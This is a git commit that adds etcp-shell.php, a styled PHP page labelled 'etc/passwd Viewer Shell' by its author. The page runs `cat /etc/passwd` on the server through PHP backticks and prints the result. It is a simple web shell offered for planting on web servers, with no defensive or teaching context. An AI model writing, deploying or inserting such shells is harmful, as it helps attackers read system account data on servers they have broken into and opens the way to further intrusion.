c848011afc1186e1f6c1024d2bdd7f50025c8187
Xale Security <81574241+xaletr@users.noreply.github.com>
2021-09-02 00:01:26 +0300

    Add files via upload

---
+++ etcp-shell.php
@@ -0,0 +1,40 @@
+<html>
+<head>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Nunito&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap');
+
+.header {
+       color: white;
+       font-size: 40px;
+       font-family: 'Roboto Mono', monospace;
+       background: -webkit-linear-gradient(#eee, #ADADAD);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+}
+
+.text {
+     color: black;
+     font-family: 'Nunito';
+	 font-size: 20px;
+	
+}
+</style>
+<title>Komut Çalıştırma</title>
+</head>
+<body>
+<center>
+	<br>
+	<br>
+<p class="header">etc/passwd Viewer Shell</p>
+<p class="text">Coded By Xale</p>
+<p class="text">My GitHub: @xaletr</p>
+<?php 
+$islem = `cat /etc/passwd`;
+
+echo "<pre>".$islem."</pre>";
+?>
+</center>
+
+</body>
+</html>
